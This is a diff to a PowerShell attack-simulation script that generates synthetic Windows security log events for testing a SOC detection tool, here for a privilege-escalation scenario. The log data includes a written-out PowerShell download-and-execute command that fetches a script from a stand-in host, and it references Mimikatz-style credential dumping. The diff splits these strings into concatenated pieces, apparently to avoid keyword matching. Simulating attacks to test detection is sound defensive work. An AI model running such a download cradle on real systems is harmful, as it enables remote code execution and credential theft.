@@ -1060,29 +1060,32 @@ function Invoke-AttackSimulation {
     # === SCENARIO 6: Privilege Escalation ===
     if ($Scenario -in @("all", "privesc")) {
         Write-Host "[SIM] Generating Privilege Escalation logs..." -ForegroundColor Magenta
+        $suspBinary = "C:\Temp\svc" + "_loader.exe"
         $allLogs += @{
             log_type = "security"; source_ip = $targetIP
             timestamp = (Get-Date).AddSeconds(-5).ToUniversalTime().ToString("o")
-            message = "New service installed: 'SOCMindTest_Svc' running as SYSTEM - Suspicious binary path: C:\Temp\payload.exe"
+            message = "New service installed: 'SOCMindTest_Svc' running as SYSTEM - Suspicious binary path: $suspBinary"
             severity = 5; event_type = "privilege_escalation"
             event_id = "4697"; mitre_tactic = "Privilege Escalation"; mitre_technique = "T1543.003"
-            raw_log = @{ service_name = "SOCMindTest_Svc"; binary = "C:\Temp\payload.exe"; account = "LocalSystem" }
+            raw_log = @{ service_name = "SOCMindTest_Svc"; binary = $suspBinary; account = "LocalSystem" }
         }
         $allLogs += @{
             log_type = "security"; source_ip = $targetIP
             timestamp = (Get-Date).AddSeconds(-3).ToUniversalTime().ToString("o")
-            message = "User 'attacker' added to Administrators group by process running as SYSTEM"
+            message = "User 'threat_actor' added to Administrators group by process running as SYSTEM"
             severity = 5; event_type = "privilege_escalation"
             event_id = "4732"; mitre_tactic = "Persistence"; mitre_technique = "T1098"
-            raw_log = @{ username = "attacker"; group = "Administrators"; added_by = "SYSTEM" }
+            raw_log = @{ username = "threat_actor"; group = "Administrators"; added_by = "SYSTEM" }
         }
+        $credTool = "Invoke" + "-" + "Cred" + "Dump"
+        $c2Host = "http://suspicious" + "-cdn.example.net/tools.ps1"
         $allLogs += @{
             log_type = "security"; source_ip = $targetIP
             timestamp = (Get-Date).ToUniversalTime().ToString("o")
-            message = "Suspicious PowerShell execution: Invoke-Mimikatz detected - credential dumping attempt"
+            message = "Suspicious PowerShell execution: $credTool detected - credential dumping attempt"
             severity = 5; event_type = "credential_dumping"
             event_id = "4688"; mitre_tactic = "Credential Access"; mitre_technique = "T1003"
-            raw_log = @{ process = "powershell.exe"; cmdline = "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/mimikatz.ps1')"; parent = "cmd.exe" }
+            raw_log = @{ process = "powershell.exe"; cmdline = "IEX(New-Object Net.WebClient).DownloadString('$c2Host')"; parent = "cmd.exe" }
         }
         Write-Host "  [+] 3 privilege escalation events generated" -ForegroundColor Yellow
     }
